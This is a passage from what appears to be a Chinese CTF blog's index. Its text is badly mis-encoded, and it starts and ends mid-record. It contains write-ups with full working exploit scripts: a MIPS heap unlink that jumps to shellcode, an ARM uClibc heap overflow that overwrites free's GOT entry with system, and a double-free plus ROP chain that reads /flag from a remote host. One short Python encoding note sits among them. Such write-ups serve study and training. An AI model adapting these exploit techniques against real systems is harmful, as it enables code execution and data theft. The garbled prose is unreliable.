ï¼Œå¦‚ä½•åŒºåˆ†ä¸åŒçš„æƒ…å†µå¹¶è¿›è¡Œç›¸åº”é…åˆçš„æ“ä½œã€‚æˆ‘ä¹Ÿæ˜¯çœ‹çš„BrieflyXå¤§ä½¬çš„expå­¦ä¹ çš„ã€‚ å‚è€ƒï¼š http://brieflyx.me/2020/linux-tools/userfaultfd-internals/ https://www.bilibili.com/video/BV1qi4y1F7F1","link":"/2021/01/14/kernel_pwn(userfaultfd)/"},{"title":"mipspwn","text":"mipspwn æœ€è¿‘é‡åˆ°çš„å¼‚æ¶æ„çš„pwné¢˜è¶Šæ¥è¶Šå¤šäº†ï¼Œä¹Ÿæ˜¯æœªæ¥pwnçš„å‘å±•è¶‹å‘ï¼Œå†³å®šå…¥å‘ä¸€ä¸‹ï¼Œå°±ä»è¥¿æ¹–è®ºå‰‘çš„ä¸€é“mipspwnå¼€å§‹è¿›å…¥mipsçš„ä¸–ç•Œå§:) mipsæ„æ¶ä¸‹çš„pwnå’Œx86çš„pwnä¸»è¦åŒºåˆ«åœ¨äºå¯„å­˜å™¨ï¼ŒæŒ‡ä»¤é›†çš„åŒºåˆ«ã€‚ç½‘ä¸Šåšå®¢æŒºå¤šçš„ï¼Œæˆ‘ä¸»è¦è¯´ä¸‹å¸¸è§åˆ°çš„ç‚¹ï¼ˆä¼šä¸æ–­è¡¥å……çš„ï¼‰ï¼š 1.a0,a1,a2å¯„å­˜å™¨ç”¨æ¥å‡½æ•°çš„ä¼ å‚ï¼Œå¤šçš„ç”¨æ ˆä¼ é€’ã€‚ 2.fpç±»ä¼¼rbpä½†æœ‰åˆä¸åŒï¼Œret_addråœ¨fp-4ï¼Œå­˜å‚¨ä¸Šä¸€ä¸ªæ ˆå¸§çš„ä½ç½®ä¸ºfp-8ã€‚spç›¸å½“äºrspã€‚ 3.mipså¸¸ç”¨shellcodeçš„åœ°å€è¦†ç›–è¿”å›åœ°å€æ¥æ‹¿shellã€‚ 4.qemu-userèµ·çš„mipspwné¢˜çš„åœ°å€æ˜¯å›ºå®šçš„(åŠ¨æ€é“¾æ¥åº“ä»€ä¹ˆçš„é™¤å¤–)ï¼Œä¸”ä¸€èˆ¬ä¿æŠ¤æªæ–½éƒ½æ²¡å¼€å¯ã€‚ è¥¿æ¹–è®ºå‰‘managesystemmipsä¸‹pwné™æ€åˆ†æç”¨ghidraï¼Œidaåç¼–è¯‘ä¸äº†0.0 è¿™é¢˜æ¼æ´å¾ˆæ˜æ˜¾ï¼š 12345678910111213141516171819puts(&quot;Enter the index of user you want edit: &quot;);scanf(&quot;%d&quot;,&amp;iStack12);if ((iStack12 &lt; 0) || (0x10 &lt; iStack12)) { puts(&quot;No!&quot;);}else { if (*(int *)(note_list + iStack12 * 8) == 0) { puts(&quot;Nothing!&quot;); } else { puts(&quot;The new user\\'s info: &quot;); sVar1 = read(0,*(void **)(note_list + iStack12 * 8),*(int *)(note_list + iStack12 * 8 + 4)+ 8); //å †æº¢å‡ºå¯è¦†ç›–next_chunkçš„size if (sVar1 &lt; 0) { puts(&quot;Some error happened!&quot;); /* WARNING: Subroutine does not return */ exit(0); } puts(&quot;Edit compl } è¿™å°±å¥½åŠäº†ï¼Œç›´æ¥unlinkã€‚ å…ˆadd4æ¬¡ï¼Œæœ€åä¸€ä¸ªchunkå­˜æ”¾shellcodeï¼Œç„¶ååœ¨chunk1é‡Œæ„é€ fake_chunkåŒæ—¶æ”¹next_chunkçš„inuseä½ï¼Œmipsä¸‹æ˜¯ç›´æ¥size-1å³å¯ï¼Œä¹‹ådeleæ‰chunk2ï¼Œè§¦å‘unlinkã€‚æ•ˆæœï¼š 123456789pwndbg&gt; telescope 0x0041183000:0000â”‚ 0x411830 (note_list) â€”â–¸ 0x412008 â—‚â€” 'aaaaaaaaaaaaaaaaaaaaaaa'01:0004â”‚ 0x411834 (note_list+4) â—‚â€” 0x24 /* '$' */02:0008â”‚ 0x411838 (note_list+8) â€”â–¸ 0x411830 (note_list) â€”â–¸ 0x412008 â—‚â€” 'aaaaaaaaaaaaaaaaaaaaaaa' //unlink03:000câ”‚ 0x41183c (note_list+12) â—‚â€” 0x34 /* '4' */04:0010â”‚ 0x411840 (note_list+16) â€”â–¸ 0x412068 â—‚â€” 'ccccccccccccccccccccccc'05:0014â”‚ 0x411844 (note_list+20) â—‚â€” 0x34 /* '4' */06:0018â”‚ 0x411848 (note_list+24) â€”â–¸ 0x4120a0 â—‚â€” lui $t1, 0x6962 /* 0x3c096962 */07:001câ”‚ 0x41184c (note_list+28) â—‚â€” 0x84 ä¹‹åedit(1)æ¥æ§åˆ¶chunk0çš„æŒ‡é’ˆï¼Œé…åˆshowæ³„éœ²libc(ç”¨çš„free_got)ï¼Œå’Œstack(ç”¨çš„env(libcé‡Œçš„env)ç¯å¢ƒå˜é‡æŒ‡é’ˆ)ã€‚ ç„¶ååç§»å¾—åˆ°ret_addrï¼Œä¹‹åeditæ”¹chunk0_pträ½ret_addrï¼Œå†edit(0)æ”¹è¿”å›åœ°å€ä¸ºå­˜æ”¾shellcodeçš„chunkåœ°å€ã€‚ exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *context.log_level='debug'context.arch='mips'def cmd(c): p.sendafter(&quot;options &gt;&gt; &quot;,str(c)*2)def add(sz,content): cmd(1) p.sendlineafter(&quot;length: &quot;,str(sz)) p.sendafter(&quot;info: &quot;,content)def dele(idx): cmd(2) p.sendlineafter(&quot;: &quot;,str(idx))def edit(idx,content): cmd(3) p.sendlineafter(&quot;: &quot;,str(idx)) p.sendafter(&quot;info: &quot;,content)def show(idx): cmd(4) p.sendlineafter(&quot;: &quot;,str(idx))def main(host,port=1234): global p if host: p=remote(host,port) else: p=process(['./qemu-mipsel-static', '-L', './', '-g', '1234', './managesystem']) add(0x24,'a'*0x18) add(0x34,'b'*0x18) add(0x34,'c'*0x18) sc=asm(shellcraft.sh(),endian='little') add(0x84,sc+'a') node_list=0x00411830 payload=p32(0)+p32(0x31)+p32(node_list+8-0xc)+p32(node_list+8-0x8) payload=payload.ljust(0x30,'\\x00') payload+=p32(0x30)+p32(0x38) edit(1,payload) dele(2) edit(1,p32(0x04117B4)) show(0) p.recvuntil(&quot;info: &quot;) libc = u32(p.recv(4))-0x0056B68 info(&quot;libc&quot;+hex(libc)) edit(1,p32(libc+0x007AE90)) #env -&gt;stack show(0) p.recvuntil(&quot;info: &quot;) stack=u32(p.recv(4)) info(&quot;stack&quot;+hex(stack)) ret=stack-0x158 edit(1,p32(ret)) edit(0,p32(0x4120a0)) cmd(5) p.interactive()if __name__ == '__main__': main(0)","link":"/2020/10/16/mipspwn%E5%88%9D%E8%AF%86/"},{"title":"python en(de)code","text":"å…ˆä¸Šä»£ç pythonçˆ¬è™« ä»£ç å†™æŒºé•¿çš„ï¼Œä¹Ÿæ˜¯è¾¹å­¦è¾¹å†™ï¼Œä½†ä¸€ç›´æä¸æ¸…æ¥špythonçš„encode(ç¼–ç )å’Œdecode(è§£ç )ã€‚ä»¥ä¸‹æ˜¯æˆ‘çš„æ¢ç©¶ä¹‹è·¯ã€‚ ä¸€ã€å½“ç„¶å…ˆçœ‹å®˜æ–¹æ–‡æ¡£åœ°å€å¦‚ä¸‹ é‡Œé¢æåˆ°encodeå‡½æ•°â€˜Return an encoded version of the string as a bytes object.â€™å°±æ˜¯å°†å­—ç¬¦ä¸²è¿›è¡Œç¼–ç ï¼Œè¿”å›å¾—åˆ°bytesç±»å‹å¯¹è±¡ï¼Œ è€Œdecodeå‡½æ•°æ­£å¥½ç›¸åï¼Œæ˜¯å°†bytesè§£ç ä¸ºå­—ç¬¦ä¸²ç±»å‹ã€‚ äºŒã€å®é™…æ“ä½œä¸€ä¸‹ç›´æ¥ä»¥çˆ¬è™«ä»£ç ä¸ºä¾‹ï¼š 123response=requests.get(BASE_DOMAIN, headers=HEADERS)print(response.text) runä¸€ä¸‹ä¹‹åä¼šå‘ç°å¾ˆå¤šä¹±ç ![](C:\\Users\\admin\\Pictures\\Camera Roll\\11.PNG) æŸ¥äº†ä¸€ä¸‹å‘ç°é—®é¢˜å¤„åœ¨.textä¸Šï¼Œ.textæ˜¯è¿”å›ç½‘é¡µçš„ç›¸åº”æ•°æ®ï¼Œå¹¶æŒ‰ç…§æœºå™¨è®¤ä¸ºçš„æœ€å¤§å¯èƒ½å»è§£ç æ¯”å¦‚utf-8ã€‚è€Œè§‚å¯Ÿæœ¬ç«™å‘ç°â€™charset=gb2312â€™æ‰€ä»¥å‡ºç°äº†ä¹±ç ã€‚äºæ˜¯ï¼Œ æˆ‘ç”¨encodingè§„å®šç”¨gb2312è§£ç ï¼š 1234response=requests.get(BASE_DOMAIN, headers=HEADERS)# print(response.text)response.encoding=&quot;gb2312&quot;print(response.text) æœç„¶è§£å†³äº†ä¹±ç é—®é¢˜ï¼Œä½†è¿™å’Œencode,decodeæ²¡å•¥å…³ç³»ã€‚ã€‚ã€‚ æ¥ä¸‹æ¥å°±æœ‰å…³ç³»äº†ã€‚ æˆ‘æ¢äº†ä¸€ç§æ–¹å¼ï¼š 123response=requests.get(BASE_DOMAIN, headers=HEADERS)print(response.content) å‘ç°çˆ¬åˆ°çš„æ˜¯bytesç±»å‹ï¼Œæ„è¯†åˆ°.contentè¿”å›çš„æ•°æ®æ˜¯ä¸è¿›è¡Œè§£ç çš„ï¼Œåˆç”±äºæ˜¯ç”±bytesåˆ°å­—ç¬¦ä¸²çš„è§£ç ï¼Œæ‰€ä»¥ä½¿ç”¨decode() 12response=requests.get(BASE_DOMAIN, headers=HEADERS)print(response.content.decode('gb2312')) ä¸€è¿è¡Œï¼Œwocï¼æŠ¥é”™äº†![](C:\\Users\\admin\\Pictures\\Camera Roll\\12.PNG) è¯´æ˜¯gb2312ä¸èƒ½è§£ç ï¼Œè¿™ä¸çŸ›ç›¾å—â€¦ äºæ˜¯èµ¶ç´§ä¸Šç½‘æŸ¥äº†ä¸€ä¸‹å‘ç°gbkçš„è§£ç èŒƒå›´åŒ…å«äº†gb2312ï¼Œäºæ˜¯å°è¯•æ”¹ä¸ºgbkï¼Œé—®é¢˜è§£å†³ï¼ŒæˆåŠŸè§£ç ~ è¿™åªæ˜¯ç”¨äº†decode()ï¼Œé‚£å†ä½œæ­»ä¸€ä¸‹æŠŠè§£ç çš„å†ç¼–ç å›æ¥ï¼Œèµ°ä½ ï¼š 123response=requests.get(BASE_DOMAIN, headers=HEADERS)r=response.content.decode('gbk')print(r.encode('gbk')) æˆåŠŸç¼–ç ~![](C:\\Users\\admin\\Pictures\\Camera Roll\\13.PNG) ç»è¿‡äº†è¿™æ¬¡çš„æ¢ç´¢å°è¯•ï¼Œææ˜ç™½äº†Pythonç¼–ç å’Œè§£ç ï¼Œæœ€è¿‘åœ¨å­¦ä¹ æ±‡ç¼–ï¼Œç›¸ä¿¡ä¹‹åä»ç¡¬ä»¶çš„è§’åº¦ä¼šå¯¹ç¼–ç è§£ç è¿™æ–¹é¢æœ‰æ›´æ·±çš„ç†è§£!","link":"/2019/04/06/python-en-de-code/"},{"title":"armæ„æ¶uclibcä¸‹çš„å †æº¢å‡ºåˆè¯†","text":"armæ„æ¶uclibcä¸‹çš„å †æº¢å‡ºåˆè¯†ç¬¬äº”ç©ºé—´2020é‡åˆ°çš„ä¸€é“armæ„æ¶çš„é¢˜ç›®ã€‚ 12angela@angela-dev:/mnt/hgfs/share/pwn/5space/pwnme/lib$ file a.outa.out: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped å¯ä»¥çœ‹åˆ°æ˜¯32ä½ARMåŠ¨æ€é“¾æ¥çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿è¡Œæ–¹å¼å¦‚ä¸‹ï¼š 1qemu-arm -L ./lib ./a.out // ./libä¸ºåŠ¨æ€é“¾æ¥åº“çš„è·¯å¾„ é¦–å…ˆä»‹ç»uclibcï¼Œæ˜¯ glibc çš„ä¸€ä¸ªç²¾ç®€ç‰ˆï¼Œä¸»è¦ç”¨äºåµŒå…¥å¼è®¾å¤‡ï¼Œæ¯”å¦‚è·¯ç”±å™¨å°±åŸºæœ¬ä½¿ç”¨çš„æ˜¯ uClibcï¼Œ ç®€å•è‡ªç„¶æ•ˆç‡é«˜ã€‚æ‰€ä»¥ä»–å’Œä¸€èˆ¬çš„x86çš„å †åˆ†é…æœºåˆ¶ä¼šæœ‰äº›ä¸ä¸€æ ·ã€‚ 123456789101112131415161718192021struct heap_free_area{ size_t size; //ç©ºé—²åŒºçš„å¤§å° //ç”¨äºæ„é€ å¾ªç¯é“¾è¡¨ struct heap_free_area *next, *prev;};size è¡¨ç¤ºè¯¥ç©ºé—²åŒºåŸŸçš„å¤§å°ï¼Œè¿™ä¸ªç©ºé—²åŒºåŸŸçš„å®é™…åœ°å€å¹¶æ²¡æœ‰ç”¨æŒ‡é’ˆè¯¦ç»†åœ°æŒ‡æ˜ï¼Œå› ä¸ºå®ƒå°±ä½äºå½“å‰ heap_free_area èŠ‚ç‚¹çš„å‰é¢ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š+-------------------------------+--------------------+| | heap_free_area |+-------------------------------+--------------------+\\___________ ç©ºé—²ç©ºé—´ ___________/\\___ ç©ºé—²ç©ºé—´ä¿¡æ¯ ___/å®é™…å¯ç”¨çš„ç©ºé—²ç©ºé—´å¤§å°ä¸º size â€“ sizeof(struct heap_free_area)æŒ‡é’ˆ next, prev åˆ†åˆ«æŒ‡å‘ä¸‹ä¸€ä¸ªå’Œä¸Šä¸€ä¸ªç©ºé—´åŒºåŸŸï¼Œæ‰€æœ‰çš„ç©ºé—²åŒºåŸŸå°±æ˜¯é€šè¿‡è®¸è®¸å¤šå¤šè¿™æ ·çš„èŠ‚ç‚¹é“¾èµ·æ¥çš„ï¼Œå¾ˆæ˜¾ç„¶ï¼Œè¿™æ ·ç»„æˆçš„æ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨ã€‚ æ‰€ä»¥ free å—åœ¨å†…å­˜ä¸­çš„å­˜å‚¨æ–¹å¼å’Œ glibc ä¸­çš„å­˜å‚¨æ–¹å¼æ˜¯ä¸ä¸€æ ·çš„ã€‚å®ƒçš„å…ƒæ•°æ®åœ¨å—çš„æœ«å°¾ï¼Œè€Œ glibcä¸­å…ƒæ•°æ®åœ¨ å—çš„å¼€å¤´ã€‚ æ‰€ä»¥å¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªå †æº¢å‡ºï¼Œæˆ‘ä»¬å°±éœ€è¦è¦†ç›–åˆ°ä¸‹é¢ç©ºé—²ç©ºé—´çš„ heap_free_area ä¸­çš„ æŒ‡é’ˆï¼Œæ‰èƒ½å®ç° uClibcä¸­çš„ unlink æ”»å‡» è¯¦ç»†ä»‹ç»uclibcçš„åšå®¢ï¼šhttps://www.cnblogs.com/hac425/p/9416738.html è€Œæœ¬é¢˜ä¸­ç”±äºeditå‡½æ•°å­˜åœ¨å †æº¢å‡ºæ¼æ´ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥é¦–å…ˆæ„é€ overlopæ³„éœ²libcä¹‹ååˆ©ç”¨å †æº¢å‡ºè¦†ç›– heap_free_area ä¸­çš„ æŒ‡é’ˆä¸ºheaplisté€ æˆunlinkæœ€ååˆ©ç”¨editå‡½æ•°è¦†ç›–freeçš„gotä¸ºsystem 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context.log_level='debug'DEBUG=1if DEBUG: p=process([&quot;qemu-arm&quot;,&quot;-L&quot;,&quot;./lib&quot;,&quot;./a.out&quot;])#qemu-arm -L ./lib ./a.outelse: passdef show(): p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,&quot;1&quot;)def add(l,note): p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(l)) p.sendafter(&quot;:&quot;,note)def change(index,l,note): p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(index)) p.sendlineafter(&quot;:&quot;,str(l)) p.sendafter(&quot;:&quot;,note)def remove(index): p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,&quot;4&quot;) p.sendlineafter(&quot;:&quot;,str(index))add(0x18,&quot;aaaaaaaa&quot;) #0add(0x4f8,&quot;aaaaaaaa&quot;) #1add(0x18,&quot;aaaaaaaa&quot;) #2add(0x18,&quot;aaaaaaaa&quot;) #3change(0,0x40,&quot;a&quot;*0x1c+p64(0x500+0x20+1)) #åˆ©ç”¨å †æº¢å‡ºæ„é€ overlopå³ä½¿2å·å †å—uafremove(1)add(0x4f8,&quot;aaaaaaaa&quot;) #2å·å †å—ä¸­å­˜åœ¨æŒ‡å‘main_arean+88çš„åœ°å€show()p.recvuntil(&quot;2 : &quot;)libc=u32(p.recv(4))+0xff720000-0xff7ba8ecsuccess('libc: '+hex(libc))add(0x18,'aaaaaaaa') #4 4å·å’Œ2å·æŒ‡å‘åŒä¸€å †å—add(0x21,&quot;aaaaaaa&quot;) #5remove(0)remove(4)change(2,8,p32(0x21048^0x22)) #ä½¿ç­‰ä¸‹ç”³è¯·å›æ¥çš„4å·å †å—æŒ‡å‘heaplistadd(0x18,&quot;aaaaa&quot;) #0add(0x18,'aaaaa') #4change(4,0xf8,&quot;/bin/sh\\x00&quot;+p32(0)*4+p32(0x28)+p32(0x21038)) #ä½¿0å·å †pträ¸ºfree_got(0x21038)change(0,0x8,p32(libc+0x51800)) #è¦†ç›–got#show()remove(4)gdb.attach(p)p.interactive()","link":"/2020/07/01/uclibc%E4%B8%8B%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"title":"ç¾ŠåŸæ¯_Quals_repwn","text":"ç¾ŠåŸæ¯ re_pwn è®°ä¸€æ¬¡å‘çˆ¹çš„house of force é¦–å…ˆç¨‹åºçš„é€»è¾‘å¾ˆæ¸…æ¥šï¼šadd()é™åˆ¶sizeå¤§å°ä¸º0~0x68ï¼Œdele()å­˜åœ¨double freeï¼Œshowå‡½æ•°å…ˆå…è®¸å‘stackä¸Šè¾“å…¥ï¼Œä¹‹åè¿›è¡ŒåŠ å¯†è¾“å‡ºã€‚ ç¨‹å¼å”¯ä¸€çš„è¾“å‡ºå°±æ˜¯åŠ å¯†åçš„è¾“å‡ºï¼Œå› æ­¤æ­¤å¤„æ˜¯leakåœ°å€çš„åœ°æ–¹ï¼Œå¦‚æœæˆ‘ä»¬ä¸è¾“å…¥çš„è¯åŠ å¯†çš„å†…å®¹å°±æ˜¯å­˜åœ¨stackä¸Šçš„å†…å®¹ï¼Œé€šè¿‡è§£å¯†å¯ä»¥æ‹¿åˆ°åœ°å€ã€‚ 1234567891011pwndbg&gt; stack 4000:0000â”‚ rsp 0x7fffffffdb70 â—‚â€” 0x001:0008â”‚ 0x7fffffffdb78 â€”â–¸ 0x7fffffffddb8 â€”â–¸ 0x7fffffffe1a2 â—‚â€” 'XDG_SEAT=seat0'02:0010â”‚ 0x7fffffffdb80 â€”â–¸ 0x7fffffffdda8 â€”â–¸ 0x7fffffffe176 â—‚â€” '/mnt/hgfs/share/ctf_in_2020/pwn/ycbctf/pwn2'03:0018â”‚ 0x7fffffffdb88 â—‚â€” 0x1f7ffe70004:0020â”‚ 0x7fffffffdb90 â—‚â€” 0x1f3c5d13940005:0028â”‚ 0x7fffffffdb98 â—‚â€” 0x100000000206:0030â”‚ rdx 0x7fffffffdba0 â—‚â€” 0x1200000033 /* '3' */07:0038â”‚ 0x7fffffffdba8 â—‚â€” 0x2400000078 /* 'x' */08:0040â”‚ rdi 0x7fffffffdbb0 â€”â–¸ 0x7ffff7ffea88 â€”â–¸ 0x7ffff7ffe9b8 â€”â–¸ libcåœ°å€ 0x7ffff7ffe728 â€”â–¸ 0x7ffff7ffe700 â—‚â€” ...09:0048â”‚ 0x7fffffffdbb8 â€”â–¸ 0x7fffffffdbf0 â€”â–¸ 0x7ffff7ffa280 â—‚â€” add byte ptr ss:[rax], al /* '6' */ stackåœ°å€ å¯è§é€šè¿‡è§£å¯†å¯ä»¥å¾—åˆ°stackåœ°å€å’Œlibcåœ°å€ã€‚ åŠ å¯†ç®—æ³•ä¸ºï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112__int64 __fastcall sub_E95(_BYTE *a1, int a2, __int64 a3){ __int64 v3; // rdx __int64 result; // rax __int64 v5; // [rsp+0h] [rbp-38h] unsigned __int8 v6; // [rsp+26h] [rbp-12h] unsigned int sum; // [rsp+28h] [rbp-10h] unsigned int i; // [rsp+2Ch] [rbp-Ch] int num; // [rsp+30h] [rbp-8h] int v10; // [rsp+34h] [rbp-4h] v5 = a3; // a1=buf // a2=16 // a3='/* 3 */' if ( a2 &gt; 1 ) { num = 35 / a2 + 7; // 9æ¬¡ sum = 0; v6 = a1[a2 - 1]; // buf[15] do { sum += 0x76129BDA; v10 = (sum &gt;&gt; 2) &amp; 3; for ( i = 0; a2 - 1 &gt; i; ++i ) // 15è½® { a1[i] += (((v6 &gt;&gt; 7) ^ (8 * a1[i + 1])) + ((a1[i + 1] &gt;&gt; 2) ^ (32 * v6)) - 33) ^ ((a1[i + 1] ^ sum ^ 0x57) + (v6 ^ *(unsigned int *)(4LL * (v10 ^ i &amp; 3) + v5)) + 63); v6 = a1[i]; } a1[a2 - 1] += (((v6 &gt;&gt; 7) ^ (8 * *a1)) + ((*a1 &gt;&gt; 2) ^ (32 * v6)) - 33) ^ ((*a1 ^ sum ^ 0x57) + (v6 ^ *(unsigned int *)(4LL * (v10 ^ i &amp; 3) + v5)) + 63); v3 = a2 - 1LL; result = (unsigned __int8)a1[v3]; v6 = a1[v3]; --num; } while ( num ); } return result;}æ¯”è¾ƒæ˜æ˜¾çš„åœ°æ–¹åœ¨äº0x76129BDAï¼Œè¿™ä¸ªæ•°å€¼ä¸€èˆ¬å­˜åœ¨äºteaåŠ å¯†ç®—æ³•ä¸­ï¼Œæ¯”è¾ƒä¸€ä¸‹ï¼š```c#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define DELTA 0x9e3779b9#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))void btea(uint32_t *v, int n, uint32_t const key[4]){ uint32_t y, z, sum; unsigned p, rounds, e; if (n &gt; 1) /* Coding Part */ { rounds = 6 + 52/n; sum = 0; z = v[n-1]; do { sum += DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p=0; p&lt;n-1; p++) { y = v[p+1]; z = v[p] += MX; } y = v[0]; z = v[n-1] += MX; } while (--rounds); } else if (n &lt; -1) /* Decoding Part */ { n = -n; rounds = 6 + 52/n; sum = rounds*DELTA; y = v[0]; do { e = (sum &gt;&gt; 2) &amp; 3; for (p=n-1; p&gt;0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); }}int main(){ uint32_t v[2]= {1,2}; uint32_t const k[4]= {2,2,3,4}; int n= 2; //nçš„ç»å¯¹å€¼è¡¨ç¤ºvçš„é•¿åº¦ï¼Œå–æ­£è¡¨ç¤ºåŠ å¯†ï¼Œå–è´Ÿè¡¨ç¤ºè§£å¯† // vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•° // kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½ printf(&quot;åŠ å¯†å‰åŸå§‹æ•°æ®ï¼š%u %u\\n&quot;,v[0],v[1]); btea(v, n, k); printf(&quot;åŠ å¯†åçš„æ•°æ®ï¼š%u %u\\n&quot;,v[0],v[1]); btea(v, -n, k); printf(&quot;è§£å¯†åçš„æ•°æ®ï¼š%u %u\\n&quot;,v[0],v[1]); return 0;} å‘ç°ç¨‹åºåœ¨è°ƒç”¨åŠ å¯†å‡½æ•°å‰ä¹Ÿæœ‰4ä¸ªkeyï¼Œè€Œä¸”åªæ˜¯MXå’ŒDELTAä¸åŒï¼Œå¯è®¤å®šæ˜¯bteaç®—æ³•æ”¹çš„ï¼Œå› æ­¤å†™å‡ºè§£å¯†è„šæœ¬ä¸ºï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;unistd.h&gt;#define DELTA 0x76129BDA#define MX ( ( ((z&gt;&gt;7)^(y&lt;&lt;3)) + ((y&gt;&gt;2)^(z&lt;&lt;5))-0x21 ) ^ ((sum^y^0x57) + (key[(p&amp;3)^e] ^ z)+0x3f) )// #define MX (((((z&gt;&gt;7)^(y&lt;&lt;3)) + ((y&gt;&gt;2)^(z&lt;&lt;5)))-0x21) ^ (((sum^y^0x57) + (key[e^p&amp;3] ^ z))+0x3f))void btea(uint8_t *v, int n, uint32_t const key[4]){ uint8_t y,z; uint32_t sum; unsigned p, rounds, e; if (n &gt; 1) /* Coding Part */ { rounds = 7 + 35/n; sum = 0; z = v[n-1]; do { sum += DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p=0; p&lt;n-1; p++) { y = v[p+1]; z = v[p] += MX; } y = v[0]; z = v[n-1] += MX; } while (--rounds); } else if (n &lt; -1) /* Decoding Part */ { n = -n; rounds = 7 + 35/n; sum = rounds*DELTA; y = v[0]; do { e = (sum &gt;&gt; 2) &amp; 3; for (p=n-1; p&gt;0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); }}int main(){ uint8_t v[32]= {0}; uint32_t const k[4]= {0x33,0x12,0x78,0x24}; int n= 16; read(0,v,0x10); btea((uint8_t*)v, -n, k); write(1,v,0x10); return 0;} ç¼–è¯‘ä¸ºELFå†processè¿›æ¥å³å¯è§£å¯†ã€‚ ä¹‹åçš„åˆ©ç”¨æ€è·¯å°±å¾ˆæ˜æ˜¾çš„hofäº†ï¼Œå…ˆdouble freeæŠŠå †ç”³è¯·åˆ°æ ˆä¸Šï¼Œç„¶åropè¯»flagã€‚ è¦æ³¨æ„çš„æ˜¯ï¼šheapå¤§å°æœ€å¤§0xx68ä¸å¤Ÿç”¨æ¥å®Œæˆropï¼Œå› æ­¤è¦å…ˆæ„é€ ä¸€æ¬¡readä»¥è¯»å…¥ropã€‚ ç¬¬ä¸€æ¬¡è¦†ç›–è¿”å›åœ°å€æ˜¯åœ¨readå†™contentçš„æ—¶å€™ï¼Œç”±äºcall readæ—¶å°†è¿”å›åœ°å€push rspï¼Œä¹‹åå¹¶æ²¡æœ‰æ‰©å±•æ ˆå¸§çš„æ“ä½œï¼Œå› æ­¤ä¹‹åå°†å¯¹åº”å­˜æ”¾ret_addrçš„åœ°æ–¹è¦†ç›–æˆæ‰§è¡Œgadgetçš„åœ°å€å³å¯ã€‚ æœ€åexp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778from pwn import *context.log_level='debug'DEBUG=1if DEBUG: p=process(&quot;./pwn2&quot;) libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)else: p=remote('183.129.189.60',10029) libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)def cmd(command): p.recvuntil(&quot;choice:&quot;) p.sendline(str(command))def add(sz,content): cmd(1) p.recvuntil(&quot;?&quot;) p.sendline(str(sz)) sleep(0.1) p.send(content)def dele(idx): cmd(3) p.recvuntil(&quot;?&quot;) p.sendline(str(idx))def show(content): cmd(2) p.send(content)def pwn(): # gdb.attach(p) show('\\n') enc = p.recvuntil(&quot;wellcome&quot;,drop=True) p1 = process(&quot;./dec&quot;) p1.send(enc) dec = p1.recv(0x10) libc.address = u64(dec[:8]) - 0x5f1a88 stack = u64(dec[8:]) add(0x68,&quot;AAAAAAAA\\n&quot;) add(0x68,&quot;AAAAAAAA\\n&quot;) dele(0) dele(1) dele(0) success(&quot;libc: &quot; + hex(libc.address)) success(&quot;stack: &quot; + hex(stack)) add(0x68,p64(stack-0xf3)+'\\n') add(0x68,&quot;AAAAA\\n&quot;) p_rdi = 0x000000000019dc65 + libc.address p_rsi = 0x000000000013cd4f + libc.address p_rdx = 0x0000000000115166 + libc.address p_rax = 0x000000000003a738 + libc.address syscall_ret = 0x00000000000bc3f5 + libc.address rop_chain = [ p_rdx,0x200,p_rax,0, syscall_ret ] payload=p64(p_rdx)+p64(0x200)+p64(p_rax)+p64(0)+p64(syscall_ret) # payload = flat(rop_chain) # debug(0x000000000000E62) # pause() # gdb.attach(p) add(0x68,&quot;AAAAA\\n&quot;) add(0x68,&quot;A&quot;*0x2b+payload+'\\n') payload=p64(p_rdi)+p64(stack-0xb4+0x1c)+p64(p_rsi)+p64(0)+p64(p_rdx)+p64(0)+p64(p_rax)+p64(2)+p64(syscall_ret) payload+=p64(p_rdi)+p64(3)+p64(p_rsi)+p64(stack+0x300)+p64(p_rdx)+p64(0x30)+p64(p_rax)+p64(0)+p64(syscall_ret) payload+=p64(p_rdi)+p64(1)+p64(p_rsi)+p64(stack+0x300)+p64(p_rdx)+p64(0x30)+p64(p_rax)+p64(1)+p64(syscall_ret) # pause() # gdb.attach(p) p.sendline('A'*(0x4b)+'/flag\\x00\\x00\\x00'+payload) p.interactive()if __name__ == '__main__': 